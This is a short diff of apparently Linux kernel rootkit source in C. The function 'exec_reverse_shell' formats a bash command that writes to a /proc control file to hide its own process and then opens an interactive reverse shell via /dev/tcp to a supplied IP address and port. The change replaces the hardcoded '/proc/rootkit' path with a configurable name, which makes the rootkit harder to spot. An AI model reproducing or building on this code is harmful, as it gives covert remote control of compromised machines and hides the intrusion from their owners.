@@ -33,8 +33,8 @@ static void exec_command(struct work_struct *w)
 
 void exec_reverse_shell(u32 ip_addr)
 {    
-    sprintf(bash_command, "echo hide$$ > /proc/rootkit && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1", 
-            (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), RPORT);
+    sprintf(bash_command, "echo hide$$ > /proc/%s && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1",
+            PROCFILE_NAME, (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), RPORT);
 
     schedule_work(&exec_work);
 }
